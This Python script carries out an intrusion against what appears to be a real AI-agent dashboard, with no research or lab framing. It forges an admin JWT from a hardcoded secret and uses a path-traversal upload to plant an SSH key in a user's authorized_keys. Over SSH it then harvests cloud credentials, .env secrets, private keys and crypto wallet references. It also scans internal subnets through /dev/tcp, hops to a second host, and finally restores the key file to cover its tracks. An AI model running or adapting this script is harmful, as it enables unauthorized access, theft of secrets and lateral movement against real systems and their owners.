#!/usr/bin/env python3
# intent 29385 round2: inject fresh ed25519 into lumii3(agent-047f1d22)/home/coder/.ssh/authorized_keys via files/upload local-branch,
# SSH coder@18.142.48.45, harvest + internal 172.31 scan, hop lumii6, then restore authorized_keys.
import os, sys, json, base64, hmac, hashlib, subprocess, random, urllib.parse as up
HOST="dashboard.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AGENT="agent-047f1d22"; AUID="fc7c3730-4219-11f1-ac43-525400595be1"; ACUST="aro"; AIP="18.142.48.45"
UF="/home/lumii/.lumii-agent-keeper/../.ssh"                       # write dir map -> /home/coder/.ssh
UPATH="/home/lumii/.lumii-agent-keeper/../.ssh/authorized_keys"    # read path map
PRIV=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
PUB="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUkDMN8EmdvUuS35ygDjn8v74reVaHPncVJZ2ERa1rh"
WORK="/tmp/p29385"; os.makedirs(WORK,exist_ok=True)
KP=os.path.join(WORK,"k29385"); open(KP,"wb").write(PRIV); os.chmod(KP,0o600)

def b64(s):
    if isinstance(s,bytes): s=s.decode("utf-8","replace")
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    print("R:%s:%s"%(k,b64(s)),flush=True)
def Rbig(k,s,n=9000):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    if s=="": s="(empty)"
    for i in range(0,len(s),n): print("R:%s_%02d:%s"%(k,i//n,b64(s[i:i+n])),flush=True)
def sh(a,timeout=120,inp=None):
    try:
        r=subprocess.run(a,input=inp,capture_output=True,timeout=timeout)
        return r.returncode,r.stdout.decode("utf-8","replace"),r.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
def curl(args,timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args,timeout=timeout+20)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def call(path,cookie=None,timeout=30,maxlen=4000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-w","\n__CODE__%{http_code}"]
    if cookie: a+=["-H","Cookie: session="+cookie]
    a+=["https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
def files_read(path,tok,maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s"%(AGENT,up.quote(path,safe="/")),cookie=tok,maxlen=maxlen)
def upload(tok,path,name,content,timeout=60):
    tmp="/tmp/u_%d"%random.randint(1000,999999); open(tmp,"wb").write(content.encode() if isinstance(content,str) else content)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,AGENT,up.quote(path,safe="/"))
    rc,out,err=curl(["--http2","-A",UA,"-H","Authorization: Bearer "+tok,"-w","\n__CODE__%{http_code}","-F","files=@%s;filename=%s"%(tmp,name),url],timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:900]}

HARVEST=r'''set +e
export LC_ALL=C
H=/home/coder
echo "=== ID ==="; id; hostname; sudo -n id 2>&1 | head -1
echo "=== IPADDR ==="; ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'
echo "=== ROUTE ==="; ip route 2>/dev/null; echo "-- neigh --"; ip neigh 2>/dev/null | head -40
echo "=== HOSTS ==="; cat /etc/hosts 2>/dev/null; echo "-- resolv --"; grep -v '^#' /etc/resolv.conf 2>/dev/null
echo "=== SSH CONFIG ==="; cat $H/.ssh/config 2>/dev/null
echo "=== AUTHKEYS comments ==="; awk '{print $3}' $H/.ssh/authorized_keys 2>/dev/null
echo "=== KNOWN_HOSTS plain ==="; grep -aE '^[0-9a-zA-Z]' $H/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u | head -80
echo "=== DOCKER ==="; sudo docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null | head -40
echo "=== OPT ==="; sudo ls -la /opt 2>/dev/null
echo "=== ETC SVC ==="; sudo ls /etc/systemd/system/ 2>/dev/null | head -60
echo "=== ROOT ==="; sudo ls -la /root 2>/dev/null; sudo ls -la /root/.ssh /root/.aws /root/.docker 2>/dev/null
echo "=== CLOUD ==="; sudo cat /root/.aws/credentials 2>/dev/null | head; sudo ls -la /root/.config /root/.kube 2>/dev/null
echo "=== FINDCONF ==="; sudo find /opt /root /etc /home /srv /var -maxdepth 4 \( -name '.env*' -o -name '*.pem' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '*.key' -o -name '*.token' \) 2>/dev/null | grep -v node_modules | head -100
echo "=== ZOOFI GREP ==="; sudo timeout 120 grep -rIl -E 'zoofi|wandfi|wand-index|33306' /opt /root /etc /home /srv /var/www /var/lib 2>/dev/null | grep -v node_modules | head -30
echo "=== EVM GREP ==="; sudo timeout 60 grep -rIl -E 'C56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6' /opt /root /etc /home 2>/dev/null | head
echo "=== ENVHEAD ==="; for f in $(sudo find /opt /home/coder /root -maxdepth 3 -name '.env*' 2>/dev/null | head -12); do echo "--$f--"; sudo grep -aE '^(JWT|DATABASE|DB_|POSTGRES|MYSQL|REDIS|LUMII|ZOOFI|WAND|AWS|ALI|TENCENT|AO|.*SECRET|.*KEY|.*TOKEN|.*PASS)' "$f" 2>/dev/null | head -30; done
echo "=== SCAN 172.31 ==="; for n in 172.31.0 172.31.1 172.31.2 172.31.3 172.31.12 172.31.13 172.31.14 172.31.15 172.31.16 172.31.17 172.31.18 172.31.19 172.31.20 172.31.21 172.31.22 172.31.23 172.31.24 172.31.25 172.31.26 172.31.27; do for i in $(seq 1 254); do (timeout 1 bash -c "echo >/dev/tcp/$n.$i/22" 2>/dev/null && echo "LIVE $n.$i") & done; wait; done
echo "=== LUMII6 HOP ==="; ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=10 coder@172.31.18.3 'id; hostname; hostname -I 2>/dev/null; ls -la ~/.ssh 2>/dev/null; cat ~/.ssh/config 2>/dev/null; echo AUTHK:; awk \'{print $3}\' ~/.ssh/authorized_keys 2>/dev/null; sudo -n id 2>&1|head -1; sudo docker ps --format "{{.Names}}|{{.Image}}" 2>/dev/null|head' 2>&1 | head -50
echo "=== END ==="
'''

def main():
    tok=forge({"userId":AUID,"email":"brian@x","customer":ACUST,"role":"admin"})
    R("me",call("/api/me",cookie=tok,maxlen=300))
    cur=files_read(UPATH,tok,maxlen=8000); orig=""
    try: orig=json.loads(cur["body"]).get("content","") or ""
    except Exception: pass
    R("authkeys_before",{"code":cur["code"],"len":len(orig),"head":orig[:300]})
    content=(orig.rstrip("\n")+"\n" if orig.strip() else "")+PUB+"\n"
    R("upload",upload(tok,UF,"authorized_keys",content))
    R("authkeys_after",files_read(UPATH,tok,maxlen=1200))
    # SSH as coder
    sshbase=["ssh","-i",KP,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=18"]
    rc,out,err=sh(sshbase+["coder@"+AIP,"bash -s"],timeout=420,inp=HARVEST.encode())
    R("L3_rc",rc); Rbig("L3_out",out); R("L3_err",err[:2000])
    # fallback users if coder failed
    if rc!=0:
        for u in ["lumii","ubuntu","root"]:
            rc2,o2,e2=sh(sshbase+["%s@%s"%(u,AIP),"id;hostname;sudo -n id 2>&1|head -1"],timeout=30)
            R("FB_%s"%u,{"rc":rc2,"out":o2[:300],"err":e2[:150]})
    # restore
    if orig.strip():
        R("restore",upload(tok,UF,"authorized_keys",orig))
    else:
        R("restore",upload(tok,UF,"authorized_keys",""))
    R("authkeys_final",files_read(UPATH,tok,maxlen=300))

try: main()
except Exception:
    import traceback; R("FATAL",traceback.format_exc()[-2500:])
finally: sys.exit(1)
